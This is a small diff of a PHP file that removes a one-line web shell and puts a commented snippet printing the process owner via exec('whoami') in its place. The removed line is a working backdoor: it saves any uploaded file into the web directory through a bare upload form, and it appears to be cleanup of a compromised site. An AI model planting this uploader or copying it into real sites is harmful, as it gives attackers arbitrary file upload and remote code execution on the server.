@@ -1,1 +1,5 @@
-<?php @copy($_FILES['file']['tmp_name'],$_FILES['file']['name']); ?><p>GiNO</p><br> <form action="" method="post" enctype="multipart/form-data">Filename: <input type="file" name="file" /><input type="submit" value="Submit" />
+<?php
+// outputs the username that owns the running php/httpd process
+// (on a system with the "whoami" executable in the path)
+echo exec('whoami');
+?>
